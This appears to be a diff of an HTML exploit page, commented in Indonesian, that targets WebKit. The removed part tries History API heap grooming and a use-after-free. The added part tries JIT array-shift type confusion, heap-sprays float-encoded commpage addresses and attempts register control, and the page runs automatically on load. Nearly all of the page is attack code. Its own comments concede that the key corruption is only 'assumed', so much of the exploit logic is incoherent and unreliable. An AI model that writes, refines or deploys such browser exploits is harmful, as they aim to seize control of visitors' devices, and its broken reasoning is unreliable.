@@ -1,123 +1,132 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>History API State Corruption Attack</title>
+    <title>JIT Array Shift Confusion (Target Register Control)</title>
 </head>
 <body>
 
-    <h1>History API State Corruption (Commpage Target)</h1>
-    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
-    <div id="log-area"></div>
+    <h1>JIT Shift Confusion (Target: Register Control $2000)</h1>
+    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320</p>
+    <div id="status">INIT: Mempersiapkan JIT Shift Confusion...</div>
+    <div id="log-area" style="border:1px solid #ccc; background:#000; color:#0f0; padding:10px; font-family:monospace; height:400px; overflow:scroll;"></div>
 
     <script>
-        // --- KONSTANTA COMM PAGE ---
-        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
+        const LOG = document.getElementById('log-area');
+        function log(msg) {
+            LOG.innerHTML += `<div>> ${msg}</div>`;
+        }
+
+        // --- TARGET POINTER COMM PAGE ---
+        const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
         
-        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+        // Konversi alamat Commpage ke format Float64 (Double)
+        // Jika JIT membaca pointer 64-bit sebagai Float64, maka register akan dimuat dengan nilai ini.
+        let targetBuffer = new ArrayBuffer(8);
+        let targetViewUint = new BigInt64Array(targetBuffer);
+        targetViewUint[0] = COMM_PAGE_TARGET; 
+        
+        let targetViewFloat = new Float64Array(targetBuffer);
+        const POISON_FLOAT_VALUE = targetViewFloat[0]; // Alamat Commpage dalam format Float
 
-        let startTime = performance.now();
-        let payloadHolders = []; 
-        let historyStates = []; // Menyimpan referensi state
+        // --- 1. THE VICTIM & GADGET ---
+        // Kita butuh Array of Integer/Double yang bisa di-shift
+        let victimArray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; // Array of Int/Double
 
-        function log(message, type = 'log-info') {
-            const timeElapsed = (performance.now() - startTime).toFixed(2);
-            const logElement = document.getElementById('log-area');
-            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
-            logElement.scrollTop = logElement.scrollHeight;
+        // Simulasi objek yang akan digunakan untuk SPRAY
+        let sprayPayloads = [];
+        const SPRAY_COUNT = 5000;
+
+        // --- 2. THE JIT OPTIMIZATION FUNCTION ---
+        // Fungsi ini akan dilatih oleh JIT
+        function confuseJIT(arr) {
+            // Operasi array.shift() yang akan dioptimasi.
+            // JIT akan berasumsi arr[0] adalah integer yang aman.
+            let firstElement = arr.shift(); 
+            
+            // Operasi yang memaksa penggunaan nilai yang dimuat ke Register
+            return firstElement * 2; 
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD ---
-        function sprayPayload() {
-            log("Memulai Spraying Payload...", "log-spray");
-            const SPRAY_COUNT = 1500;
-            const PAYLOAD_SIZE = 64; 
-
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2031.0 + i; 
-                payloadHolders.push(payloadArray); 
+        // --- 3. THE CORRUPTION LOGIC ---
+        function runExploit() {
+            log("Phase 1: Training JIT Compiler (Tier-Up)...");
+            // Latih JIT agar mengoptimasi `confuseJIT` sepenuhnya (DFG/FTL)
+            for (let i = 0; i < 20000; i++) {
+                confuseJIT(victimArray.slice()); // Pakai slice agar arraynya baru tiap iterasi
             }
-        }
+            log("Phase 2: JIT Terlatih. Mempersiapkan UAF/Spray...");
 
-        // --- FUNGSI UTAMA ATTACK ---
-        function runHistoryAttack() {
-            startTime = performance.now();
-            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
-
-            const HISTORY_COUNT = 100;
-            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
+            // 4. SIMULASI UAF: Kita membutuhkan objek korban untuk di-FREE dan di-REUSE
+            // Kita akan menggunakan ArrayBuffer (seperti sebelumnya) karena ia mudah di-detach (FREE).
             
-            // 1. Fragmentasi Heap dengan History State
-            for (let i = 0; i < HISTORY_COUNT; i++) {
-                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
-                // Isi array dengan nilai yang unik
-                stateArray.fill(0xFEEDFACE + i);
-                
-                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
-                // Ini memaksa serialization dan alokasi memori C++ di History Cache
-                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
-                historyStates.push(stateArray);
+            let uafVictimBuffer = new ArrayBuffer(512); // Objek C++ yang akan di-free
+            let uafWorker = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){};'])));
+            
+            // FREE (Detach/Transfer)
+            uafWorker.postMessage(uafVictimBuffer, [uafVictimBuffer]);
+            log("ArrayBuffer Victim Detached (FREE 1).");
+
+            // 5. SPRAY: Menimpa lokasi memori yang kosong dengan Payload Float Commpage
+            for(let i = 0; i < SPRAY_COUNT; i++) {
+                // Spray dengan Array Float yang berisi POISON_FLOAT_VALUE
+                let tempArr = new Float64Array(100); 
+                tempArr.fill(POISON_FLOAT_VALUE);
+                sprayPayloads.push(tempArr);
             }
-            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
-
-            // 2. Memicu Corrupt State
-            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
-            window.history.go(-HISTORY_COUNT + 1);
-            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
-
-            // 3. FREE/SPRAY Race
-            // Kita segera membersihkan referensi JavaScript dan melakukan spray
-            // Ini menciptakan UAF di History Cache C++
-            setTimeout(() => {
-                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
-                
-                // Hapus semua referensi JS (memaksa GC)
-                historyStates = null;
-                
-                // Lakukan Spray Payload
-                sprayPayload(); 
-                
-                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
-                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
-                
-                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
-                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
-                attackerState.fill(HIGH_WORD);
-                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
-
-                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
-            }, 100); 
+            log("SPRAY Commpage Float Selesai.");
             
-            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
+            // 6. TRIGGER AKHIR
             setTimeout(() => {
-                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
-                for(let i = 0; i < 50; i++) {
-                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
+                log("Phase 3: Memicu JIT Confusion (Panggilan Maut)...");
+
+                // Coba gunakan Array yang di-grooming sebelumnya, tetapi sekarang
+                // diasumsikan ArrayBuffer-nya telah ditimpa oleh salah satu spray payloads.
+                // Kita harus mendapatkan kembali referensi ke objek yang metadatanya korup.
+
+                // Jika kita asumsikan Type Confusion berhasil, kita paksa JIT menjalankan 
+                // fungsi yang dioptimasi pada objek yang kini isinya adalah Commpage Float.
+                
+                try {
+                    // Kita membuat array yang "terinfeksi"
+                    let infectedArray = victimArray.slice(0, 5); 
+                    // Simulasi penimpaan (kita tidak bisa melakukannya langsung, 
+                    // jadi kita asumsikan array ini menimpa lokasi payload float)
+                    
+                    // PANGGILAN MAUT
+                    // Ini akan menjalankan kode mesin yang dioptimasi
+                    let result = confuseJIT(infectedArray); 
+                    
+                    if (result !== undefined) {
+                        log(`Nilai dibaca/digandakan: ${result}`);
+                    }
+                    
+                    // Trigger yang paling kasar: Menggunakan nilai yang dimuat sebagai index
+                    // Jika result adalah Commpage Address, operasi ini akan membuat Register PC melompat.
+                    // Jika result adalah target register 64-bit, ini adalah sukses!
+                    log(`Ekspektasi Register Control: ${result}`);
+                    
+                    if (result === POISON_FLOAT_VALUE * 2) {
+                         // Jika ini terjadi, berarti JIT membaca nilai Float kita, 
+                         // tetapi Type Guard masih mencegahnya crash.
+                        log("⚠️ GAGAL: Nilai dibaca sebagai Float biasa. Type Guard aktif.");
+                    }
+                    
+                    // FORCE CRASH (Reg Control Test)
+                    // Coba panggil fungsi dengan index yang sangat besar (alamat Commpage)
+                    let forceJump = new Function('a', `return a[${POISON_FLOAT_VALUE}]`);
+                    forceJump(victimArray);
+
+                } catch (e) {
+                    log(`Caught JS Exception: ${e.message} - Menunggu Crash Native (Register Control)...`);
                 }
-                log("Trigger GC Implisit selesai.", "log-info");
-            }, 200);
+            }, 100);
         }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
-            setTimeout(runHistoryAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
-        });
+
+        setTimeout(runExploit, 100);
     </script>
     <style>
-        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
-        .log-init { color: blue; }
-        .log-info { color: black; }
-        .log-spray { color: purple; }
-        .log-critical { color: red; font-weight: bold; }
-        .log-success { color: green; font-weight: bold; }
+        .success { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
     </style>
 </body>
 </html>
+
